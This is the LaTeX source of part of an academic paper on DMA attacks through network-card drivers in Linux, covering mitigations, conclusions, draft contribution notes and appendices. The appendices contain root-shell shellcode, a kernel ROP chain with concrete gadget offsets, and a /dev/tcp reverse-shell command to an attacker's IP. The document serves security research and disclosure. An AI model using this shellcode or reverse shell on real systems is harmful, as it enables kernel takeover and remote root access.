Intel control flow enforcement technology (CET) is a new instruction set for mitigating ROP attacks \cite{Int17}. Processors that support CET use two stacks simultaneously instead of the regular one, with the new shadow stack having only return addresses rather than a full copy of the data. During each RET command, the address in the shadow stack is checked and the code continues running only if the stacks agree on the address. Even if an attacker manages to control the regular stack, the shadow stack prevents the attack. In addition, each legitimate indirect jump target is marked with a special instruction. Thus, it is impossible to jump to arbitrary locations in the code and JOP attacks are also prevented. Similarly, each legitimate call target is also marked. De Raadt recently announced the Kernel Address Randomized Link (KARL) for FreeBSD as a software mitigation \cite{dr17}. Each time the system is booted, it links a new, randomized kernel binary. This is true randomization (as opposite to Linux’s kASLR), making it impossible to patch the payload during runtime. Both KARL and CET will successfully mitigate simple ROP/kASLR attacks whenever widely applied. 
\textcolor{magenta}{Need to mention new (Non default - Only impacts RingFlod)kernel configs SHUFFLE\_PAGE\_ALLOCATOR \url{https://lore.kernel.org/patchwork/patch/1037734/}}



\section{Discussion and conclusions}

Once a malicious device exists, launching a DMA attack boils down to connecting the device to an external port and only for a few seconds. Furthermore, recent leaks from clandestine agencies show that they have been attacked by both shipping infected hardware \cite{Gal14} and connecting external malicious devices \cite{Fin14}. Namely, no DMA attack could work without the unintentional exposure of restricted fields.

\begin{comment}
\footnote{\url{https://lore.kernel.org/lkml/20180510230948.GF190385@bhelgaas-glaptop.roam.corp.google.com/}}.
\end{comment}

As we demonstrate in this paper, the blame is not with the device drivers alone, rather, more often it is the OS design choices that open up the system to DMA attacks. With the existing API used for I/O operations and due to performance considerations, it is extremely difficult not to create a \subpage{} vulnerability. Thus, even well-written drivers can be subverted by the OS (e.g., bnx2 by deferred protection). Examples to this include:

\begin{enumerate}
    \item API: 
    \begin{itemize}[wide, labelwidth=!, labelindent=0pt]
        \item The \textit{dma\_map\_single} call accepts a pointer and the buffer length. This API insinuates that only the mapped bytes are exposed, when, in fact, the whole page is accessible.
        \item \textit{dma\_unmap\_single}, insinuates that the buffer is not accessible to the device after the call. This does not hold both due to deferred protection and type (c) \subpage{} vulnerabilities.
        \item \textit{build\_skb} facilitates building an \skb{} around an arbitrary I/O buffer, in turn, embedding critical data structures inside an I/O buffer.
        \item While \texttt{page\_frag} is an efficient allocator, it inherently creates a type (c) \subpage{} vulnerability.
    \end{itemize} 
    \item Tools/Infrastructure: 
    \begin{itemize}[wide, labelwidth=!, labelindent=0pt]
            \item \texttt{page\_pool} API, by caching I/O buffers and avoiding expensive unmaps, the drivers \emph{circumvent} the security techniques of the OS. 
            \item \shinfo{} is by design built within an I/O buffer. Avoiding type (b) \subpage{} vulnerabilities imposes a challenge.
            \item No dedicated allocates for I/O such as proposed in previous works (e.g., \cite{MSMT18,MMT16}).
    \end{itemize}
\end{enumerate}

We contend that a better API and better mechanisms can provide driver authors with better options for writing secure and performant device drivers. Specifically, for \shinfo{}, which is ingrained in the Linux network stack, we urge the use of pointer obfuscation \cite{Coo17}, and solely non-linear RX buffers as an alternative to a new design. Additionally, we urge the use of analysis tools that detects \subpage{} vulnerabilities and offer \tool{} and \dkasan as a starting point towards a more secure DMA.


%\smallskip
%\textcolor{olive}{Its important to note, that while our static analysis tool is able to flag potential \simple vulnerabilities fairly easily; the tool has trouble \compound attacks, due to the complexity of the kernel. This work also does not claim to cover all possible \compound attacks, and only provides a glimpse at the possible. Several attacks we have considered, but were not able to implement. We could modify the \emph{accomplice} attack, in a way that the user send a callback pointer in user space instead of a ROP attack, this attack unfortunately doesn't work due to Kernel smep/smap defences. Another attack; can exploit attempt exploiting ICMP packets. In the ICMP code we have noticed that RX skbs can be reused as TX skbs in ICMP replies. Eventually, we couldnt generate a flow that fill force such a reuse; this might just be because of lack of trying on our part. Forcing such a scenario is helpful to an attacker, with write access to \shinfo{}, for a TX packet can create a scenario allowing a memory dump just like we have shown.... :(- All Ive got... }

%\SV{modified... still requires some work}

%It is also important to note that while our static analysis tool is able to flag potential \simple{} vulnerabilities fairly easily, the tool is less efficient in detecting a potential to \compound{} attacks, mainly, due to the complexity of the kernel. That is, while the tool detects potential trifecta members, there is a need for a human expert to analyze the findings. 

%This work also does not claim to cover all possible \compound{} attacks, and only provides a glimpse at the possible using the trifecta principle. 

%That are also several attacks that we have considered but were not able to successfully execute: (1) we attempted to modify the \emph{accomplice} attack in a way that the user sends a callback pointer in user space instead of a ROP attack. This attack fails due to the Kernel smep/smap defences; (2) we attempted to exploit ICMP packets. In the ICMP code we have noticed that RX skbs can be reused as TX skbs in ICMP replays. Eventually, we could not generate a flow that fill force such a reuse. \SV{next sentence is unclear}Forcing such a scenario is helpful to an attacker, with write access to \shinfo{}, for a TX packet can create a scenario allowing a memory dump.

%\section{Appendix A}

\subsection{All contributions made in Gils work \cite{gil}}

\begin{description}
  
\item[Sub Page] Exploiting the sub page vulnerability to access metadata.
\item[Deferred protection] Exploiting IOTLB invalidation to hack correct NIC drivers.
\item[KASLR] Reading random ptrs to guess the random address bits, Leaking data via Sub Page.
\item[FreeBSD UMA] Hacking FreeBSD memory allocator.
\item[\texttt{Question RDMA}] Can IPoIB driver be exploited in additional ways? Other RDMA issues.
\end{description}

\subsection{All contributions made in NDSS paper\cite{thunder}:}
\begin{description}
\item[attack 1,2] Windows attacks, irrelevant.
\item[attack 3] MAC OS reading VPN data, irrelevant.
\item[attack 4] Shared mappings between devices: MAC OS (Also Windows)mbufs open to read/write - Same as Gils  attack \#1 on thunderbolt.
\item[attack 5] FreeBSD per device iommu:  Same as Gils  attack \#1 on thunderbolt (p.9). Mention that Linux is invulnerable.
\item[attack 6] Linux leaks nat tables - random subpage hits - No known IOVA, NO way of knowing as READ=!Write
\item[attack 7] Linux leaking data by avoiding TX completions - would hit T/O issues and driver restart.
\item[attack 8] ATS - Self serve IOMMU by NIC. 
\end{description}

\subsection{Shared contributions:}
\begin{description}
\item[Sub Page] Shared Mdata - Data mapping.
\item[KALSR] KASLR leaking due to sub page.
\end{description}

\subsection{New Contribution}

\begin{description}
\item[skb shared info] Shared Mdata in Linux skb. 
\item[page cahe colocation] RX data allocated from page cache - means that after unmap page is still accessible via iova of next buffer - (strict and deferred vulnerable). This is stronger then sub page, as dense mappings 
allow for an attack even with strict API and correct ordering.
\item[RingFlod] Determining PFNs for attack. \texttt{What else is accessible by the NIC, what config, FW return codes/values? - Is kva visible}.
\item[HOTPage] A TX page reused in RX - allowing for temp R/W access with open valid kva (zero knowledge)-- \texttt{I'm pretty sure overlap is impossible and this approach is invalid}.
\end{description}

\bibliographystyle{plain}
\bibliography{references}
\appendix

\newpage

\section{Shell Code}\label{apx:shellcode}

To open the new shell, we use a Linux kernel functionality allowing the spawning of user processes with root privileges. It is possible to both lunch a local shell with root access using,
 $$\textbf{\nobreak ``/sbin/getty -aroot tty9''},$$
and open a remote shell, providing root access to a remote user with,
$$\textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}.$$

\begin{figure}[h]
        \begin{verbatim}
;push ``/sbin/getty -aroot tty9''
mov  rax, 0x003979747420746f
push rax
mov  rax, 0x6f72612d20797474
push rax
mov  rax, 0x65672f6e6962732f
push rax

xor  rdi, rdi
mov  rsi, rsp
xor  rdx, rdx
mov  rax, <argv_split>
call rax

mov  rdi, qword [rax]
mov  rsi, rax
xor  rcx, rcx
mov  rax, <call_usermodehelper>
call rax

pop  rax
pop  rax
pop  rax
ret
        \end{verbatim}
        \caption{Shell code for spawning a new local root shell.}
        \label{fig:shellcode_1}
\end{figure}


\clearpage

\begin{figure}[b]
        \begin{lstlisting}[
        basicstyle = \footnotesize,
        columns = fullflexible,
        %frame = l,
        language = C
        ]
KERNEL_BASE := 0xffffffff81000000; // patch using leaked pointers
ATTACK_PAGE := 0xffff880043430000; // arbitrary selected address

// Fake ubuf_info structure, starting with the callback pointer.
// This is the entry point of the attack.
page[0x000] = KERNEL_BASE + 0x6b511d; // call qword ptr[rdi + 0x3b0]

// pivoting code
page[0x3B0] = KERNEL_BASE + 0x1091fd; // mov rax, qword ptr [rdi + 0x68] ;
                                            // mov rbp, rsp ; call qword ptr [rax]
page[0x068] = &ATTACK_PAGE[0x100];
page[0x100] = KERNEL_BASE + 0x2499c1; // mov rax, qword ptr [rax + 0x38] ;
                                            // call qword ptr [rax + 0x28]
page[0x138] = &ATTACK_PAGE[0x200];
page[0x228] = KERNEL_BASE + 0x16fab6;   // mov rbx, qword ptr [rax + 8] ;
                                            // mov rdi, rax ; call qword ptr [rax]
page[0x208] = &ATTACK_PAGE[0x210];
page[0x210] = KERNEL_BASE + 0x1319ee; // push rax; jmp qword ptr[rcx]
page[0x200] = KERNEL_BASE + 0x2499c1; // mov rax, qword ptr [rax + 0x38] ;
                                            // call qword ptr [rax + 0x28]
page[0x238] = &ATTACK_PAGE[0x300];
page[0x328] = KERNEL_BASE + 0x2ccb61; // mov rcx, qword ptr[rax + 8] ;
                                            // mov rdi, rax; call qword ptr[rax]
page[0x308] = &ATTACK_PAGE[0x310];
page[0x310] = KERNEL_BASE + 0x159c86; // pop rsp ; ret
page[0x300] = KERNEL_BASE + 0x20fb7b; // mov rax, qword ptr[rax + 0x30] ;
                                            // mov r8, qword ptr[rax + 0x40] ;
                                            // call qword ptr[rbx]

page[0x330] = &ATTACK_PAGE[0xF68]; // our new stack :)

// ``/sbin/getty -aroot tty9''
page[0x400] = 0x65672f6e6962732f;
page[0x408] = 0x6f72612d20797474;
page[0x410] = 0x003979747420746f;

// helping pointers
page[0x500] = KERNEL_BASE + 0x0d7b05; // pop rsi; ret
page[0x508] = KERNEL_BASE + 0x12dacd; // pop rdi; ret

// stack
page[0xF68] = KERNEL_BASE + 0x0d7b05; // pop rsi; ret
page[0xF70] = &ATTACK_PAGE[0x400];
page[0xF78] = KERNEL_BASE + 0x12dacd; // pop rdi; ret
page[0xF80] = 0;
page[0xF88] = KERNEL_BASE + 0x11bac2; // pop rdx ; ret
page[0xF90] = 0;
page[0xF98] = KERNEL_BASE + 0x3a00d0; // &argv_split
page[0xFA0] = KERNEL_BASE + 0x005dfc; // pop rcx ; ret
page[0xFA8] = &ATTACK_PAGE[0x500];
page[0xFB0] = KERNEL_BASE + 0x1319ee; // push rax; jmp qword ptr[rcx]
page[0xFB8] = KERNEL_BASE + 0x5822a2; // mov rax, qword ptr [rax] ; ret
page[0xFC0] = KERNEL_BASE + 0x005dfc; // pop rcx ; ret
page[0xFC8] = &ATTACK_PAGE[0x508];
page[0xFD0] = KERNEL_BASE + 0x1319ee;// push rax; jmp qword ptr[rcx]
page[0xFD8] = KERNEL_BASE + 0x005dfc;// pop rcx ; ret
page[0xFE0] = 0;
page[0xFE8] = KERNEL_BASE + 0x0896a0; // &call_usermodehelper
page[0xFF0] = KERNEL_BASE + 0x4c0f0e; // xor rax, rax ; ret
page[0xFF8] = KERNEL_BASE + 0x003795; // leave ; ret
        \end{lstlisting}
        %\vspace{-5mm}
        \caption{
                ROP attack to open a remote shell on the attacker's machine. The pivoting code uses \texttt{rdi} register, which points to the page, providing \means{}.}
        \label{fig:shellcode_2}
\end{figure}



%The following command opens a remote shell on the attacker's machine.

%This shellcode size is less than 100 bytes, which means that it fits into a single writable page. We used the same page where the initial attack took place, when possible. Finally, for all attacks, 
%we validated that the shellcode was able to run when the computer is locked, successfully showing a gaining access scenario as well. 
%We also implemented improved versions of this shellcode: We implemented a ROP payload based on this shellcode in order to bypass DEP protection. For the basic case, we implemented both the ROP and the regular version using fixed kernel pointers (e.g., function calls). When kASLR was enabled, we patched the payload during attack execution. Lastly, we replaced the string \textbf{\nobreak ``/sbin/getty -aroot tty9''}, which opens a local shell, with the string \textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}, which opens a remote shell on the attacker's machine. We used port 80 (HTTP) in order to bypass firewalls, but any port could be used.


%In (Fig. \ref{fig:shellcode_2} we show a ROP attack, based on the same Linux functionality to open a remote shell on the attacker's machine.

%

%\textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''},

%We implemented ROP payloads based on the shellcode used in the basic case (\ref{fig:shellcode_1}), showing that DEP could not prevent the attack. Using the ROP gadget tool1\footnote{https://github.com/JonathanSalwan/ROPgadget}, we searched Linux kernel binaries for gadgets that together achieve the same logic as the original shellcode. When we implemented the attack, we took advantage
%of the common practice of passing a ‘this’ pointer to a callback as the first parameter. According to the System V AMD64 ABI calling conventions (which Linux follows), the first parameter is passed in the rdi register, so the pivoting code can use it to find the new stack. Without it, we could not find the stack.
%We implemented two different versions, one for FireWire and one for NICs (Fig \ref{fig:shellcode_2}), of the ROP payloads. One minor difference between the versions is that in the network cards case, we used a modified OS and hence the binary was different. The more important difference is that in the NICs case, the callback was not pointed directly from the writable structure but had another level of indirection. As a result, the attacker could choose the address of the structure holding the callback and control rdi. This is essential for payload spraying, because the stack lies in the sprayed page, which has an arbitrary address. In the FireWire case, rdi is always pointing to the attacked sbp2 management orb, forcing the stack to be in the same page.

\newpage
\section{Driver lists}
These lists are based on Linux kernel 5.0. 
\subsection{drivers - DMA\_BIDIR}
\begin{enumerate}
    \item bnxt
    \item cxgb4
    \item dpaa2
    \item i40e
    \item ixgbe
    \item mlx4
    \item mlx5 - Driver safe
    \item myri10ge
    \item qede
    \item ti
    \item ath9k - EDMA
    \item iwlwifi
\end{enumerate}
\subsection{Wrong Unmap order}{\label{apndx:wrong_order}}
A partial list of drivers that dont unmap the RX buffer or do it \textbf{after} initialising the \shinfo.
\begin{itemize}

    \item Intel 40GbE NIC driver : i40e
    \item Mellanox Connectx 5/6 : mlx5\_core\footnote{mlx5\_core has two modes, linear and non-linear. Linear mode is the default}
\end{itemize}
\subsection{Correct unmap order}
{\label{apndx:correct_order}}
A partial list of drivers that unmap the RX buffer before initialising the \shinfo 
\begin{itemize}
    \item Broadcom : bnx2
\end{itemize}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\end{document}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
